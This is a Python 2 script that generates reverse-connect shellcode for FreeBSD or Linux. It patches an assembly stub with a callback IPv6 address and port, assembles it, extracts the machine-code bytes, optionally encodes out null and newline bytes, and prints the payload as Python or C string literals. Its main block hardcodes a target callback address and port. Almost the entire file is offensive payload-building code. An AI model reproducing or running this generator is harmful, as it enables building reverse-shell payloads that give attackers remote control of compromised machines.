#!/usr/bin/python
import struct
import os
import sys
import tempfile

class ReverseScodeGen():
    def __init__(self, ipAddrStr, portNum, secondStageSize, platform = "freebsd", encodeFlag = False ):
        self.encodeFlag = encodeFlag
        self.ipAddrStr = ipAddrStr
        self.portNum = portNum
        self.secondStageSize = secondStageSize

        if platform == "freebsd":
            self.stubDir = "./stub/freebsd"
        elif platform == "linux":
            self.stubDir = "./stub/linux"
        else:
            print "platform [%s] is not available" % platform
            raise Exception("asdf")


        self.curPath =  os.path.abspath(sys.path[0])
        self.curPath = self.curPath.replace("\\", "/")
        print self.curPath        
        self.tempDir =  self.curPath + "/tmp/"
        
        tempfile.tempdir = self.tempDir

        self.tempFilename = tempfile.mktemp()
        self.tempFilename = self.tempFilename.replace("\\", "/")

        self.asmFilename = self.tempFilename + ".s"
        self.objFilename = self.tempFilename + ".o"
        self.dumpFilename = self.tempFilename + ".dump"
        self.binFilename = self.tempFilename + ".bin"
        self.encFilename = self.tempFilename + ".enc.bin"

        print "[*] tempFilename : [%s]" % self.tempFilename        
        
        self.scodeBinStr = ""
        
        self.__prepareStub()
        self.scodeBinStr = self.__loadScode()
        if encodeFlag == True:
            self.scodeBinStr = self.encode()
        return

    def convertIpAddrStr(self,ipAddrStr):
        t = ["%02x" % int(x) for x in self.ipAddrStr.split(".")]
        t.reverse()
        ipAddr = int( "".join(t),16)
        return ipAddr
    
    def convertPortNum(self, portNum):
        convPortNum = 0
        convPortNum += (portNum & 0xff) << 8
        convPortNum += (portNum & 0xff00) >>8
        return convPortNum
    
    def __prepareStub(self):
        sys.stdout.write("[*] __prepareStub()\n")
        # prepare stub
        fstr = open("%s/reverse.s" % self.stubDir).read()
        
        fstr = fstr.replace("0xbfbf", "0x%04x" % self.convertPortNum(self.portNum))

        ipValues = self.ipAddrStr.split(":")
        
        fstr = fstr.replace("0x11111111", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[1],16)),
                                                           self.convertPortNum(int(ipValues[0],16)))))        
        fstr = fstr.replace("0x11111112", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[3],16)),
                                                           self.convertPortNum(int(ipValues[2],16)))))        
        fstr = fstr.replace("0x11111113", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[5],16)),
                                                           self.convertPortNum(int(ipValues[4],16)))))        
        fstr = fstr.replace("0x11111114", ("0x%04x%04x" % (self.convertPortNum(int(ipValues[7],16)),
                                                           self.convertPortNum(int(ipValues[6],16)))))
        
        sys.stdout.write("[*] IP Addr : [%s]\n" % ( self.ipAddrStr))
        sys.stdout.write("[*] Port : [0x%04x] [%d]\n" % (self.portNum, self.portNum))

        
        fstr = fstr.replace("0xaaaa", "0x%04x" % self.secondStageSize)        
        
        open(self.asmFilename, "w").write(fstr)

        # compile stub
        os.system("as %s -o %s" % (self.asmFilename, self.objFilename))
        os.system("objdump -d %s > %s" % (self.objFilename, self.dumpFilename))
        return

    def __loadScode(self):
        sys.stdout.write("[*] __loadScode()\n")        
        fstr = open(self.dumpFilename).read()

        scodeBinStr = ""

        for line in fstr.split("\n"):
            if line.find(":") != 4:
                continue
            items = line.split("\t")

            addr = int(items[0][:-1], 16)
            hexStr = items[1].rstrip().lstrip()
            try:
                insStr = items[2].rstrip().lstrip()
            except:
                insStr = "NULL"

            scodeBinStr += "".join(map(lambda x:chr(int(x,16)), hexStr.split()))

        open(self.binFilename, "wb").write(scodeBinStr + "\x00")
        sys.stdout.write("[*] wrote [0x%x] [%d] bytes shellcode\n" % (len(scodeBinStr), len(scodeBinStr)))

        testStr = "%s/%s/testScode %s" % (self.curPath, self.stubDir[1:], self.binFilename)
        sys.stdout.write(testStr + "\n")

        testStr = "./testScode ../../tmp/%s" % self.binFilename[self.binFilename.rfind("/"):]
        sys.stdout.write(testStr + "\n")        
        return scodeBinStr

    def getBinScode(self):
        return self.scodeBinStr

    def getPythonFormatScode(self):
        scodeStr = """SCODE = ""\n"""
        for i,c in enumerate(self.scodeBinStr):
            if i%8 == 0:
                scodeStr += "SCODE += \""
            scodeStr += "\\x%02x" % ord(c)
            if i%8 == 7:
                scodeStr += "\"\n"                

        scodeStr += "\""
        return scodeStr
        
    def getCppFormatScode(self):
        scodeStr = """char SCODE[] = ""\n"""
        for i,c in enumerate(self.scodeBinStr):
            if i%8 == 0:
                scodeStr += "\""
            scodeStr += "\\x%02x" % ord(c)
            if i%8 == 7:
                scodeStr += "\"\n"                
        scodeStr += "\";"        
        return scodeStr
        
    def encode(self):
        sys.stdout.write("[*] encode()\n")                

        restrictedBytes = "0x00,0x0d,0x0a"

        cmdStr = "./encoder/encoder %s %s > %s" % (self.binFilename, restrictedBytes, self.encFilename)
        print cmdStr
        os.system(cmdStr)
        
        scodeBinStr = open(self.encFilename, "rb").read()
        sys.stdout.write("[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(scodeBinStr), len(scodeBinStr)))        
        return scodeBinStr

if __name__ == "__main__":
    ipAddrStr = "dc19:c7f:2011:2:0000:0000:0000:153"        
    gen = ReverseScodeGen( ipAddrStr, 34567, 0x180, platform="freebsd", encodeFlag=True)
    gen.getBinScode()
    print gen.getPythonFormatScode()
    #print gen.getCppFormatScode()    
